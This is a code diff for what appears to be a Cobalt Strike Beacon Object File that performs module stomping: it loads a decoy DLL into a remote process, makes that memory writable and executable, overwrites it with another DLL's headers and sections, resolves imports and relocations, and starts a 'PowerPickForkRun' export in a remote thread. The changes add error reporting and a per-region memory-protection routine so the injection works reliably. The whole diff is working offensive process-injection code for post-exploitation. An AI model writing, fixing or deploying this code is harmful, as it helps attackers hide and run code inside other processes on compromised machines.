@@ -51,6 +51,54 @@ static LPVOID PpfStompRemoteAlloc(HANDLE hProcess, SIZE_T size, DWORD protect)
         hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
 }
 
+static void PpfStompFail(const char* step)
+{
+    BeaconPrintf(
+        CALLBACK_ERROR,
+        "[!] stomp: %s failed (err=%lu)",
+        step,
+        KERNEL32$GetLastError());
+}
+
+/*
+ * PE images are multiple regions — VirtualProtectEx(base, SizeOfImage) fails.
+ * Walk with VirtualQueryEx and protect each committed region in the range.
+ */
+static BOOL PpfStompProtectRange(
+    HANDLE hProcess,
+    LPVOID addr,
+    SIZE_T size,
+    DWORD protect)
+{
+    BYTE* p = (BYTE*)addr;
+    BYTE* end = p + size;
+
+    while (p < end) {
+        MEMORY_BASIC_INFORMATION mbi;
+        DWORD oldProt = 0;
+        SIZE_T chunk;
+        BYTE* regionEnd;
+
+        if (KERNEL32$VirtualQueryEx(hProcess, p, &mbi, sizeof(mbi)) == 0) {
+            return FALSE;
+        }
+        if (mbi.State != MEM_COMMIT) {
+            return FALSE;
+        }
+        regionEnd = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
+        chunk = (SIZE_T)(regionEnd - p);
+        if (p + chunk > end) {
+            chunk = (SIZE_T)(end - p);
+        }
+        if (!KERNEL32$VirtualProtectEx(
+                hProcess, p, chunk, protect, &oldProt)) {
+            return FALSE;
+        }
+        p += chunk;
+    }
+    return TRUE;
+}
+
 /* result = fn(rcx, rdx); store at out. */
 static BOOL PpfStompRemoteCall2(
     HANDLE hProcess,
@@ -611,27 +659,30 @@ static BOOL PpfStompHostDll(
     ULONG_PTR entry;
     LPVOID remoteMapName = NULL;
     SIZE_T mapNameLen;
-    DWORD oldProt = 0;
     WORD secIndex;
     int v;
 
     if (!hProcess || !hostDll || hostDllLen < 0x200 || !mapName) {
+        PpfStompFail("args");
         return FALSE;
     }
 
     dos = (IMAGE_DOS_HEADER*)hostDll;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+        PpfStompFail("dos");
         return FALSE;
     }
     nt = (IMAGE_NT_HEADERS64*)(hostDll + dos->e_lfanew);
     if (nt->Signature != IMAGE_NT_SIGNATURE ||
         nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        PpfStompFail("nt");
         return FALSE;
     }
 
     sizeOfImage = nt->OptionalHeader.SizeOfImage;
     sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
     if (sizeOfHeaders > (DWORD)hostDllLen || sizeOfImage < sizeOfHeaders) {
+        PpfStompFail("sizes");
         return FALSE;
     }
 
@@ -647,37 +698,55 @@ static BOOL PpfStompHostDll(
         remoteBase = 0;
     }
     if (!remoteBase) {
+        PpfStompFail("LoadLibraryEx victim");
         return FALSE;
     }
 
     /* Ensure victim mapping is large enough (read remote SizeOfImage). */
     {
-        BYTE hdr[0x200];
+        BYTE hdr[0x400];
+        IMAGE_DOS_HEADER* remoteDos;
         IMAGE_NT_HEADERS64* remoteNt;
         DWORD remoteSize;
+        DWORD lfanew;
+
         if (!PpfStompRemoteRead(hProcess, (LPCVOID)remoteBase, hdr, sizeof(hdr))) {
+            PpfStompFail("read victim hdr");
             return FALSE;
         }
-        remoteNt =
-            (IMAGE_NT_HEADERS64*)(hdr + ((IMAGE_DOS_HEADER*)hdr)->e_lfanew);
+        remoteDos = (IMAGE_DOS_HEADER*)hdr;
+        lfanew = (DWORD)remoteDos->e_lfanew;
+        if (remoteDos->e_magic != IMAGE_DOS_SIGNATURE ||
+            lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) {
+            PpfStompFail("victim pe hdr");
+            return FALSE;
+        }
+        remoteNt = (IMAGE_NT_HEADERS64*)(hdr + lfanew);
         remoteSize = remoteNt->OptionalHeader.SizeOfImage;
         if (remoteSize < sizeOfImage) {
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] stomp: victim too small (need=%lu have=%lu)",
+                (unsigned long)sizeOfImage,
+                (unsigned long)remoteSize);
             return FALSE;
         }
     }
 
-    if (!KERNEL32$VirtualProtectEx(
+    /* Protect only committed regions (full SizeOfImage protect fails). */
+    if (!PpfStompProtectRange(
             hProcess,
             (LPVOID)remoteBase,
             sizeOfImage,
-            PAGE_EXECUTE_READWRITE,
-            &oldProt)) {
+            PAGE_EXECUTE_READWRITE)) {
+        PpfStompFail("VirtualProtectEx regions");
         return FALSE;
     }
 
     /* Write our headers + sections over the victim. */
     if (!PpfStompRemoteWrite(
             hProcess, (LPVOID)remoteBase, hostDll, sizeOfHeaders)) {
+        PpfStompFail("write headers");
         return FALSE;
     }
 
@@ -690,10 +759,12 @@ static BOOL PpfStompHostDll(
             }
             if (sec[secIndex].PointerToRawData + sec[secIndex].SizeOfRawData >
                 (DWORD)hostDllLen) {
+                PpfStompFail("section bounds");
                 return FALSE;
             }
             if (sec[secIndex].VirtualAddress + sec[secIndex].SizeOfRawData >
                 sizeOfImage) {
+                PpfStompFail("section va");
                 return FALSE;
             }
             if (!PpfStompRemoteWrite(
@@ -701,6 +772,11 @@ static BOOL PpfStompHostDll(
                     (LPVOID)(remoteBase + sec[secIndex].VirtualAddress),
                     hostDll + sec[secIndex].PointerToRawData,
                     sec[secIndex].SizeOfRawData)) {
+                BeaconPrintf(
+                    CALLBACK_ERROR,
+                    "[!] stomp: write section[%u] failed (err=%lu)",
+                    (unsigned)secIndex,
+                    KERNEL32$GetLastError());
                 return FALSE;
             }
         }
@@ -713,17 +789,20 @@ static BOOL PpfStompHostDll(
             (const BYTE*)hostDll,
             (DWORD)hostDllLen,
             sizeOfImage)) {
+        PpfStompFail("relocs");
         return FALSE;
     }
 
     if (!PpfStompResolveImports(
             hProcess, remoteBase, (const BYTE*)hostDll, (DWORD)hostDllLen)) {
+        PpfStompFail("imports");
         return FALSE;
     }
 
     exportRva = PpfStompGetExportRva(
         (const BYTE*)hostDll, (DWORD)hostDllLen, "PowerPickForkRun");
     if (!exportRva) {
+        PpfStompFail("export");
         return FALSE;
     }
     entry = remoteBase + exportRva;
@@ -738,6 +817,7 @@ static BOOL PpfStompHostDll(
                 0,
                 0,
                 15000)) {
+            PpfStompFail("DllMain");
             return FALSE;
         }
     }
@@ -746,10 +826,15 @@ static BOOL PpfStompHostDll(
     remoteMapName = PpfStompRemoteAlloc(hProcess, mapNameLen, PAGE_READWRITE);
     if (!remoteMapName ||
         !PpfStompRemoteWrite(hProcess, remoteMapName, mapName, mapNameLen)) {
+        PpfStompFail("map name");
         return FALSE;
     }
 
     /* Fire-and-forget — export ExitProcess's when done. */
-    return PpfStompRemoteCall4(
-        hProcess, entry, 0, remoteBase, (ULONG_PTR)remoteMapName, 0, 0);
+    if (!PpfStompRemoteCall4(
+            hProcess, entry, 0, remoteBase, (ULONG_PTR)remoteMapName, 0, 0)) {
+        PpfStompFail("PowerPickForkRun thread");
+        return FALSE;
+    }
+    return TRUE;
 }
